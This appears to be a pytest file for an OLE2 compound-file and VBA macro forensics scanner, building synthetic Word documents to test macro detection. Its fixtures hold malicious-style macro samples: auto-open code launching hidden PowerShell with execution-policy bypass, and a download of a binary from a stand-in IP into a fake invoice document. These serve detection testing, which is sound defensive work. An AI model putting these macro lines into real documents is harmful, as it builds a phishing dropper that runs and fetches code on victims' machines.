"""Tests for GEAR-14: OLE2 Compound File & VBA Macro Forensics."""

from __future__ import annotations

import struct
from pathlib import Path

from aether_re.ole_macro import (
    CFB_SIGNATURE,
    STGTY_ROOT,
    STGTY_STORAGE,
    STGTY_STREAM,
    decompress_vba_stream,
    scan_file_ole_macro,
    scan_ole_vba,
)


def _compress_vba_literals(raw: bytes) -> bytes:
    """Create a valid MS-OVBA compressed stream using literal token groups."""
    out = bytearray([0x01])  # Signature byte
    chunk = bytearray()
    i = 0
    while i < len(raw):
        block = raw[i : i + 8]
        chunk.append(0x00)  # Flag byte: all 8 tokens are literals
        chunk.extend(block)
        i += 8
    # Chunk header: size - 3 in lower 12 bits, 0xB000 signature in upper 4 bits (compressed=1)
    header = ((len(chunk) - 1) & 0x0FFF) | 0xB000
    out.extend(struct.pack("<H", header))
    out.extend(chunk)
    return bytes(out)


def _build_synthetic_cfb(stream_name: str, stream_payload: bytes) -> bytes:
    """Builds a minimal valid 512-byte-sector MS-CFB image in memory.

    Layout:
      Header: 512 bytes (offset 0)
      Sector 0: FAT sector (offset 512)
      Sector 1: Directory sector (offset 1024)
      Sector 2..N: Stream data sectors (offset 1536..)
    """
    sector_size = 512
    # Pad stream payload to sector boundary
    num_stream_sectors = max(1, (len(stream_payload) + sector_size - 1) // sector_size)
    padded_stream = stream_payload.ljust(num_stream_sectors * sector_size, b"\x00")

    # Build Header
    header = bytearray(sector_size)
    header[0:8] = CFB_SIGNATURE
    struct.pack_into("<H", header, 24, 0x003E)  # Minor version
    struct.pack_into("<H", header, 26, 0x0003)  # Major version 3 (512-byte sectors)
    struct.pack_into("<H", header, 28, 0xFFFE)  # Byte order little-endian
    struct.pack_into("<H", header, 30, 9)  # Sector shift: 1 << 9 = 512
    struct.pack_into("<H", header, 32, 6)  # Mini sector shift: 1 << 6 = 64
    struct.pack_into("<I", header, 44, 1)  # Number of FAT sectors = 1
    struct.pack_into("<I", header, 48, 1)  # First directory sector = 1
    struct.pack_into("<I", header, 56, 64)  # Mini stream cutoff = 64 bytes (force regular stream)
    struct.pack_into("<I", header, 60, 0xFFFFFFFE)  # First MiniFAT sector = ENDOFCHAIN
    struct.pack_into("<I", header, 64, 0)  # Number of MiniFAT sectors = 0
    struct.pack_into("<I", header, 68, 0xFFFFFFFE)  # First DIFAT sector = ENDOFCHAIN
    struct.pack_into("<I", header, 72, 0)  # Number of DIFAT sectors = 0

    # DIFAT array at offset 76 (109 entries)
    struct.pack_into("<I", header, 76, 0)  # FAT is in Sector 0
    for idx in range(1, 109):
        struct.pack_into("<I", header, 76 + idx * 4, 0xFFFFFFFF)

    # Sector 0: FAT
    fat = [0xFFFFFFFF] * (sector_size // 4)
    fat[0] = 0xFFFFFFFD  # FATSECT
    fat[1] = 0xFFFFFFFE  # Directory sector ENDOFCHAIN
    for s in range(num_stream_sectors):
        sec_id = 2 + s
        if s + 1 < num_stream_sectors:
            fat[sec_id] = sec_id + 1
        else:
            fat[sec_id] = 0xFFFFFFFE
    fat_bytes = struct.pack(f"<{len(fat)}I", *fat)

    # Sector 1: Directory (4 entries of 128 bytes each)
    dir_sec = bytearray(sector_size)

    def _pack_dir_entry(
        idx: int,
        name: str,
        etype: int,
        left: int,
        right: int,
        child: int,
        start_sec: int,
        size: int,
    ) -> None:
        base = idx * 128
        name_utf16 = (name + "\x00").encode("utf-16le")
        dir_sec[base : base + len(name_utf16)] = name_utf16
        struct.pack_into("<H", dir_sec, base + 64, len(name_utf16))
        dir_sec[base + 66] = etype
        dir_sec[base + 67] = 1  # Black
        struct.pack_into("<i", dir_sec, base + 68, left)
        struct.pack_into("<i", dir_sec, base + 72, right)
        struct.pack_into("<i", dir_sec, base + 76, child)
        struct.pack_into("<I", dir_sec, base + 116, start_sec)
        struct.pack_into("<Q", dir_sec, base + 120, size)

    # Entry 0: Root Entry
    _pack_dir_entry(0, "Root Entry", STGTY_ROOT, -1, -1, 1, 0xFFFFFFFE, 0)
    # Entry 1: VBA Storage
    _pack_dir_entry(1, "VBA", STGTY_STORAGE, -1, -1, 2, 0xFFFFFFFE, 0)
    # Entry 2: Module Stream
    _pack_dir_entry(
        2,
        stream_name,
        STGTY_STREAM,
        -1,
        -1,
        -1,
        2,
        len(stream_payload),
    )

    return bytes(header) + fat_bytes + bytes(dir_sec) + padded_stream


def test_ovba_decompression_roundtrip():
    vba_code = (
        b'Attribute VB_Name = "ThisDocument"\r\n'
        b"Sub AutoOpen()\r\n"
        b'    CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden"\r\n'
        b"End Sub\r\n"
    )
    compressed = _compress_vba_literals(vba_code)
    decompressed = decompress_vba_stream(compressed)
    assert decompressed == vba_code


def test_ole_macro_detects_compressed_vba_and_autoexec(tmp_path: Path):
    vba_source = (
        b'Attribute VB_Name = "NewMacros"\r\n'
        b"Sub Document_Open()\r\n"
        b'    Dim x As Object\r\n'
        b'    Set x = CreateObject("WScript.Shell")\r\n'
        b'    x.Run "cmd.exe /c powershell.exe -ep bypass"\r\n'
        b'    URLDownloadToFile 0, "http://198.51.100.1/a.bin", "C:\\temp\\a.bin", 0, 0\r\n'
        b"End Sub\r\n"
    )
    compressed_stream = _compress_vba_literals(vba_source)
    cfb_bytes = _build_synthetic_cfb("NewMacros", compressed_stream)

    doc_path = tmp_path / "invoice_macro.doc"
    doc_path.write_bytes(cfb_bytes)

    report = scan_file_ole_macro(doc_path)
    assert report.is_ole is True
    assert report.is_valid_cfb is True
    assert report.has_vba is True
    assert "NewMacros" in report.vba_modules
    assert "document_open" in report.autoexec_triggers
    assert "execution" in report.suspicious_indicators
    assert "network_download" in report.suspicious_indicators
    assert "WScript.Shell" in report.extracted_macros["NewMacros"]


def test_ole_macro_handles_non_ole_file(tmp_path: Path):
    plain = tmp_path / "readme.txt"
    plain.write_bytes(b"Just a regular text file without CFB header.")

    report = scan_file_ole_macro(plain)
    assert report.is_ole is False
    assert report.is_valid_cfb is False
    assert report.has_vba is False
    assert report.error is not None
